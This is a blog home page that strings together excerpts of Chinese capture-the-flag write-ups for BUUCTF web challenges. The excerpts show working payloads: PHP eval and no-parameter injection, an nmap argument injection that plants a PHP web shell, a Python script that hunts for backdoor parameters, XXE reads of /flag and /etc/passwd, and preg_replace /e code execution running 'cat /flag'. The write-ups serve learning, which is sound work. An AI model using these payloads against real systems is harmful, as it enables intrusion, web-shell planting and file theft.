
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8" />
    <title>why</title>
    <meta name="author" content="why" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <link rel="icon" href="/images/avatar.jpg" />
    <link rel="preconnect" href="https://s4.zstatic.net" />
<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
<link rel="preconnect" href="https://fonts.loli.net" />
<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
<script> const mixins = {}; </script>

<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>


<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
<link
    rel="stylesheet"
    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
/>
<script src="/js/lib/highlight.js"></script>



<script src="/js/lib/preview.js"></script>





<script src="/js/lib/home.js"></script>

<link rel="stylesheet" href="/css/main.css" />

<meta name="generator" content="Hexo 7.1.1"></head>
<body>
    <div id="layout">
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>加载过慢请开启缓存 浏览器默认开启</p>
                    <img src="/images/loading.gif" />
                </div>
            </div>
        </transition>
        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
    <nav id="desktop-menu">
        <a class="title" href="/">
            <span>WHY</span>
        </a>
        
        <a href="/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
    </nav>
    <nav id="mobile-menu">
        <div class="title" @click="showMenuItems = !showMenuItems">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;WHY</span>
        </div>
        <transition name="slide">
            <div class="items" v-show="showMenuItems">
                
                <a href="/">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-house fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                    </div>
                </a>
                
                <a href="/about">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-id-card fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                    </div>
                </a>
                
                <a href="/archives">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-box-archive fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                    </div>
                </a>
                
                <a href="/categories">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-bookmark fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                    </div>
                </a>
                
                <a href="/tags">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-tags fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                    </div>
                </a>
                
            </div>
        </transition>
    </nav>
</div>
<transition name="fade">
    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
</transition>

        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
            <div id="home-head">
    <div id="home-background" ref="homeBackground" data-images="/images/background.jpg"></div>
    <div id="home-info" @click="homeClick">
        <span class="loop"></span>
        <span class="loop"></span>
        <span class="loop"></span>
        <span class="loop"></span>
        <span class="info">
            <div class="wrap">
                <h1>why</h1>
                <h3>疯疯癫癫的小辣鸡</h3>
                <h5></h5>
            </div>
        </span>
    </div>
</div>
<div id="home-posts-wrap" true ref="homePostsWrap">
    <div id="home-posts">
        

<div class="post">
    <a href="/2024/05/10/buu%E5%88%B7%E9%A2%98%E9%9B%86/GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/">
        <h2 class="post-title">[GXYCTF2019]禁止套娃</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/5/10
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <p><img src="/2024/05/10/buu%E5%88%B7%E9%A2%98%E9%9B%86/GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240510214924514.png" alt="image-20240510214924514"></p>
<p>emm</p>
<p>扫描</p>
<p>git泄露</p>
<p>githack直接拿到源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">echo &quot;flag在哪里呢？&lt;br&gt;&quot;;</span><br><span class="line">if(isset($_GET[&#x27;exp&#x27;]))&#123;</span><br><span class="line">    if (!preg_match(&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">        if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\((?R)?\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">            if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">                // echo $_GET[&#x27;exp&#x27;];</span><br><span class="line">                @eval($_GET[&#x27;exp&#x27;]);</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                die(&quot;还差一点哦！&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;再好好想想！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;还想读flag，臭弟弟！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>就是说禁止了伪协议和很多杂七杂八的东西对吧</p>
<p>但是是要使用伪协议类似的东西看flag的话</p>
<p>我只知道有可能是无参数注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>





<h4 id="无参数注入"><a href="#无参数注入" class="headerlink" title="无参数注入"></a>无参数注入</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`scandir(&#x27;.&#x27;)`这个函数的作用是扫描当前目录</span><br><span class="line">`localeconv()`函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是`.`</span><br><span class="line">`pos()/current()`函数返回数组第一个值</span><br><span class="line">`array_reverse()`是将数组颠倒</span><br><span class="line">`next()`将数组指针一项下一位</span><br><span class="line">`show_source()`的意思是读取函数内容</span><br></pre></td></tr></table></figure>

<p>三种读取方法</p>
<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>使用使上述文件数组反转后取next位即flag.php。然后读取文件<br>构造<code>exp=show_source(next(array_reverse(scandir(pos(localeconv())))));</code></p>
<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>同上述方法，但方法一有局限性，只能得到数组的第二位或者倒数第二位。其他情况可以使用随机返回键名的方法(刷新几次就可以得到)<br><code>exp=show_source(array_rand(array_flip(scandir(pos(localeconv())))));</code></p>
<h2 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h2><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="built_in">session_start</span>(): 告诉PHP使用session;</span><br><span class="line"><span class="built_in">session_id</span>(): 获取到当前的session_id值；</span><br><span class="line">手动设置cookie中PHPSESSID=flag.php；</span><br><span class="line">所以可以构造exp=<span class="built_in">show_source</span>(<span class="built_in">session_id</span>(<span class="built_in">session_start</span>()));</span><br></pre></td></tr></table></figure>

            
        </div>
    </div>
    <div class="post-tags">
        
        
        
    </div>
    <a href="/2024/05/10/buu%E5%88%B7%E9%A2%98%E9%9B%86/GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2024/05/10/buu%E5%88%B7%E9%A2%98%E9%9B%86/BSidesCF-2019-Futurella/">
        <h2 class="post-title">[BSidesCF 2019]Futurella</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/5/10
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <p>查看源代码</p>
<p>好！</p>
<p>拿到flag</p>
<p>啊？</p>

            
        </div>
    </div>
    <div class="post-tags">
        
        
        
    </div>
    <a href="/2024/05/10/buu%E5%88%B7%E9%A2%98%E9%9B%86/BSidesCF-2019-Futurella/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2024/05/10/buu%E5%88%B7%E9%A2%98%E9%9B%86/BUUCTF-2018-Online-Tool/">
        <h2 class="post-title">[BUUCTF 2018]Online Tool</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/5/10
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <p><img src="/2024/05/10/buu%E5%88%B7%E9%A2%98%E9%9B%86/BUUCTF-2018-Online-Tool/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240510190058849.png" alt="image-20240510190058849"></p>
<p>这里可以看到会创建一个文件以你输入进去的文件命名</p>
<p>三个点，一个是最后一行是什么意思</p>
<p>第二个是escapeshellarg和escapeshellcmd是什么意思</p>
<p>第三个，payload长啥样</p>
<p>1、</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -T5 -sT -Pn --host-timeout 2 -F host</span><br><span class="line"></span><br><span class="line">-T&lt;0-5&gt; : 速度/时间模板参数，指定了扫描的速度。</span><br><span class="line"></span><br><span class="line">-sT : 使用TCP进行扫描。</span><br><span class="line"></span><br><span class="line">-Pn : 将所有主机视为在在线，跳过主机发现。</span><br><span class="line"></span><br><span class="line">--host-timeout : 设置超时时间。设置为2秒，即如果目标主机在2秒内没有响应，Nmap将放弃该主机的扫描。</span><br><span class="line"></span><br><span class="line">-F : 进行快速扫描，用于快速识别目标主机上开放的常见端口，而不扫描所有的端口。</span><br></pre></td></tr></table></figure>

<p>2、</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数</span><br><span class="line">功能 ：escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，</span><br><span class="line">这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec(), system() 执行运算符(反引号)</span><br><span class="line"></span><br><span class="line">escapeshellcmd — shell 元字符转义</span><br><span class="line">功能：escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。</span><br><span class="line">此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。</span><br></pre></td></tr></table></figure>

<p>也就是说前后互相抵消了</p>
<p>3、</p>
<p>这里采用的是，将一句话木马写入文件中在通过蚁剑读取文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?host=&#x27; &lt;?php eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php</span><br></pre></td></tr></table></figure>

<p>将前面的一句话木马写入hack.php中</p>
<p>会发现</p>
<p><img src="/2024/05/10/buu%E5%88%B7%E9%A2%98%E9%9B%86/BUUCTF-2018-Online-Tool/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240510192216503.png" alt="image-20240510192216503"></p>
<p>你处于这个文件夹之下，所以在这个文件夹下开启hackbar.php</p>
<p>之后通过蚁剑连接网站</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://76fc35ad-270b-4945-96ce-a4c8c3809cd0.node5.buuoj.cn:81/71622f2db96673162a8eedefbeeae0ee/hack.php</span><br></pre></td></tr></table></figure>

<p>从而找到flag</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这道题的最重要的一点在于escape两个函数的应用</p>
<p>之后要去好好看看各自的作用</p>
<p>arg：</p>
<p>简单地说，如果输入内容不包含单引号，则直接对输入的字符串添加一对单引号括起来；如果输入内容包含单引号，则先对该单引号进行转义，再对剩余部分字符串添加相应对数的单引号括起来。</p>
<p>看个例子就知道了：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(escapeshellarg($_GET[p]));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>先输入字符串mi1k7ea，看到escapeshellarg()会给该字符串整个加上单引号括起来，加起来总共9个字符：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;mi1k7ea&#x27;</span><br></pre></td></tr></table></figure>

<p>输入mi1k’7ea，看到先转义了中间这个单引号，再分别在左右两边加上单引号括起来，加起来总共13个字符：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;mi1k&#x27;\&#x27;&#x27;7ea&#x27;</span><br></pre></td></tr></table></figure>

<p>cmd：</p>
<p>简单地说，第一，如果输入内容中上述出现的特殊字符会被反斜杠给转义掉；第二，如果单引号和双引号不是成对出现时，会被转义掉。</p>
<p>输入mi1k7ea，其中不包含以上特殊字符的字符串，是不会添加单引号括起来的，内容不变：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mi1k7ea</span><br></pre></td></tr></table></figure>

<p>输入’mi1k’7ea’;字符串，由于前面两个单引号成对了因此没有对其进行转义，而最后的单引号没有成对因此被转义掉，除此之外分号作为特殊字符也被转义处理：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;mi1k&#x27;7ea\&#x27;</span><br></pre></td></tr></table></figure>


            
        </div>
    </div>
    <div class="post-tags">
        
        
        
    </div>
    <a href="/2024/05/10/buu%E5%88%B7%E9%A2%98%E9%9B%86/BUUCTF-2018-Online-Tool/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2024/05/10/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/">
        <h2 class="post-title">[强网杯 2019]高明的黑客</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/5/10
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <img src="/2024/05/10/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240516210127863.png" alt="image-20240516210127863" style="zoom:80%;">

<p>下载源码之后解压</p>
<p>发现了三千多文件，要找到可以用的参数</p>
<p>脚本如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line">print(&#x27;开始时间：  &#x27;+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1=threading.Semaphore(100)  							  			#这儿设置最大的线程数</span><br><span class="line">filePath = r&quot;D:\phpstudy_pro\WWW\src&quot;</span><br><span class="line">os.chdir(filePath)													#改变当前的路径</span><br><span class="line">requests.adapters.DEFAULT_RETRIES = 5								#设置重连次数，防止线程数过高，断开连接</span><br><span class="line">files = os.listdir(filePath)</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = False											 # 设置连接活跃状态为False</span><br><span class="line">def get_content(file):</span><br><span class="line">    s1.acquire()</span><br><span class="line">    print(&#x27;trying   &#x27;+file+ &#x27;     &#x27;+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    with open(file,encoding=&#x27;utf-8&#x27;) as f:							#打开php文件，提取所有的$_GET和$_POST的参数</span><br><span class="line">            gets = list(re.findall(&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;, f.read()))</span><br><span class="line">            posts = list(re.findall(&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;, f.read()))</span><br><span class="line">    data = &#123;&#125;														#所有的$_POST</span><br><span class="line">    params = &#123;&#125;														#所有的$_GET</span><br><span class="line">    for m in gets:</span><br><span class="line">        params[m] = &quot;echo &#x27;xxxxxx&#x27;;&quot;</span><br><span class="line">    for n in posts:</span><br><span class="line">        data[n] = &quot;echo &#x27;xxxxxx&#x27;;&quot;</span><br><span class="line">    url = &#x27;http://127.0.0.1/src/&#x27;+file</span><br><span class="line">    req = session.post(url, data=data, params=params)			#一次性请求所有的GET和POST</span><br><span class="line">    req.close()												# 关闭请求  释放内存</span><br><span class="line">    req.encoding = &#x27;utf-8&#x27;</span><br><span class="line">    content = req.text</span><br><span class="line">    #print(content)</span><br><span class="line">    if &quot;xxxxxx&quot; in content:									#如果发现有可以利用的参数，继续筛选出具体的参数</span><br><span class="line">        flag = 0</span><br><span class="line">        for a in gets:</span><br><span class="line">            req = session.get(url+&#x27;?%s=&#x27;%a+&quot;echo &#x27;xxxxxx&#x27;;&quot;)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()												# 关闭请求  释放内存</span><br><span class="line">            if &quot;xxxxxx&quot; in content:</span><br><span class="line">                flag = 1</span><br><span class="line">                break</span><br><span class="line">        if flag != 1:</span><br><span class="line">            for b in posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:&quot;echo &#x27;xxxxxx&#x27;;&quot;&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()												# 关闭请求  释放内存</span><br><span class="line">                if &quot;xxxxxx&quot; in content:</span><br><span class="line">                    break</span><br><span class="line">        if flag == 1:													#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span><br><span class="line">            param = a</span><br><span class="line">        else:</span><br><span class="line">            param = b</span><br><span class="line">        print(&#x27;找到了利用文件： &#x27;+file+&quot;  and 找到了利用的参数：%s&quot; %param)</span><br><span class="line">        print(&#x27;结束时间：  &#x27; + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line">for i in files:															#加入多线程</span><br><span class="line">   t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">   t.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>最终找到了利用文件： xk0SzyKwfzw.php </p>
<p>找到了利用的参数：Efa5BVG</p>
<p>最后构造payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xk0SzyKwfzw.php?Efa5BVG=cat /flag</span><br></pre></td></tr></table></figure>

<p>找到flag</p>

            
        </div>
    </div>
    <div class="post-tags">
        
        
        
    </div>
    <a href="/2024/05/10/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2024/05/09/buu%E5%88%B7%E9%A2%98%E9%9B%86/NCTF2019-Fake-XML-cookbook/">
        <h2 class="post-title">[NCTF2019]Fake XML cookbook</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/5/9
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <p><img src="/2024/05/09/buu%E5%88%B7%E9%A2%98%E9%9B%86/NCTF2019-Fake-XML-cookbook/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240509220351314.png" alt="image-20240509220351314"></p>
<p>随便登录抓包之后看到这个</p>
<p>想着应该是改这个，但是怎么改？</p>
<p><img src="/2024/05/09/buu%E5%88%B7%E9%A2%98%E9%9B%86/NCTF2019-Fake-XML-cookbook/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240509220333814.png" alt="image-20240509220333814"></p>
<p>这里就要使用到xml</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE llw [</span><br><span class="line">&lt;!ENTITY file SYSTEM  &quot;file:///flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">	&lt;username&gt;&amp;file;&lt;/username&gt;</span><br><span class="line">	&lt;password&gt;1&lt;/password&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure>

<p>拿到flag</p>
<p>解读一下，就是在这里定义file为后面的字符串且会被当做变量执行</p>
<p>所以这里的$file等于flag</p>
<h4 id="下面介绍一下xml注入："><a href="#下面介绍一下xml注入：" class="headerlink" title="下面介绍一下xml注入："></a>下面介绍一下xml注入：</h4><p>XML是一种数据组织存储的数据结构方式，安全的XML在用户输入生成新的数据时候应该只能允许用户接受的数据，需要过滤掉一些可以改变XML标签也就是说改变XML结构插入新功能（例如新的账户信息，等于添加了账户）的特殊输入，如果没有过滤，则可以导致XML注入攻击。</p>
<h4 id="XML注入前提条件"><a href="#XML注入前提条件" class="headerlink" title="XML注入前提条件"></a>XML注入前提条件</h4><p>（1）用户能够控制数据的输入<br>（2）程序有拼凑的数据</p>
<p><strong>XML基本格式与基本语法</strong><br><em>基本格式：</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;&lt;!--xml文件的声明--&gt;</span><br><span class="line">&lt;bookstore&gt;                                                 &lt;!--根元素--&gt;</span><br><span class="line">&lt;book category=&quot;COOKING&quot;&gt;        &lt;!--bookstore的子元素，category为属性--&gt;</span><br><span class="line">&lt;title&gt;Everyday Italian&lt;/title&gt;           &lt;!--book的子元素，lang为属性--&gt;</span><br><span class="line">&lt;author&gt;Giada De Laurentiis&lt;/author&gt;                  &lt;!--book的子元素--&gt;</span><br><span class="line">&lt;year&gt;2005&lt;/year&gt;                                     &lt;!--book的子元素--&gt;</span><br><span class="line">&lt;price&gt;30.00&lt;/price&gt;                                  &lt;!--book的子元素--&gt;</span><br><span class="line">&lt;/book&gt;                                                 &lt;!--book的结束--&gt;</span><br><span class="line">&lt;/bookstore&gt;                                       &lt;!--bookstore的结束--&gt;</span><br></pre></td></tr></table></figure>

<p>简单介绍一下DTD实体</p>
<p><em>按实体使用方式分类，实体分为内部声明实体和引用外部实体</em><br><em>内部实体</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>内部实体示例代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY writer &quot;Dawn&quot;&gt;</span><br><span class="line">    &lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;test&gt;&amp;writer;©right;&lt;/test&gt;</span><br></pre></td></tr></table></figure>

<p><em>外部实体</em><br>外部实体，用来引入外部资源。有<code>SYSTEM</code>和<code>PUBLIC</code>两个关键字，表示实体来自本地计算机还是公共计算机。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br><span class="line">或者</span><br><span class="line">&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>参数实体+外部实体示例代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">  &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">  %file;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p><code>%file</code>(参数实体)是在DTD中被引用的，而<code>&amp;file;</code>是在xml文档中被引用的。</p>

            
        </div>
    </div>
    <div class="post-tags">
        
        
        
    </div>
    <a href="/2024/05/09/buu%E5%88%B7%E9%A2%98%E9%9B%86/NCTF2019-Fake-XML-cookbook/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2024/05/09/buu%E5%88%B7%E9%A2%98%E9%9B%86/BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/">
        <h2 class="post-title">[BJDCTF2020]ZJCTF，不过如此</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/5/9
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <p><img src="/2024/05/09/buu%E5%88%B7%E9%A2%98%E9%9B%86/BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240509210053534.png" alt="image-20240509210053534"></p>
<p>include后面有个next的注释，猜测使用data伪协议读取</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=next.php</span><br></pre></td></tr></table></figure>

<p>接下来就是绕过text了</p>
<p>需要控制参数text利用伪协议写入文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、使用php://input</span><br><span class="line">	?text=php://input</span><br><span class="line">	post:I have a dream</span><br><span class="line">2、使用data://</span><br><span class="line">	?text=data:text/plain,I have a dream</span><br><span class="line">	?text=data:text/plain;base64,SSBoYXZlIGEgZHJlYW0=</span><br></pre></td></tr></table></figure>

<p>随便采取某种方法吧</p>
<p>最后都会得到</p>
<p>一串字符串</p>
<p>base64解码之后会变成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$_SESSION[&#x27;id&#x27;] = $id;</span><br><span class="line"></span><br><span class="line">function complex($re, $str) &#123;</span><br><span class="line">    return preg_replace(</span><br><span class="line">        &#x27;/(&#x27; . $re . &#x27;)/ei&#x27;,</span><br><span class="line">        &#x27;strtolower(&quot;\\1&quot;)&#x27;,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">foreach($_GET as $re =&gt; $str) &#123;</span><br><span class="line">    echo complex($re, $str). &quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getFlag()&#123;</span><br><span class="line">	@eval($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看到complex那，那里有一个漏洞，文章最后会进行讲解</p>
<p>主要动作就是</p>
<p>preg_replace(‘.*’)&#x2F;ei’,’strtolower(“\1”)’, {${此处填函数名}});</p>
<p>这个函数可以是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?\S*=$&#123;phpinfo()&#125;</span><br><span class="line">即查看phpinfo</span><br></pre></td></tr></table></figure>

<p>也就是可以直接把{}内的东西当代码执行</p>
<p>在这里我们尝试一下这个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure>

<p>发现不行</p>
<p><img src="/2024/05/09/buu%E5%88%B7%E9%A2%98%E9%9B%86/BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240509213631533.png" alt="image-20240509213631533"></p>
<p>被过滤了</p>
<p>尝试一下使用post传入数据</p>
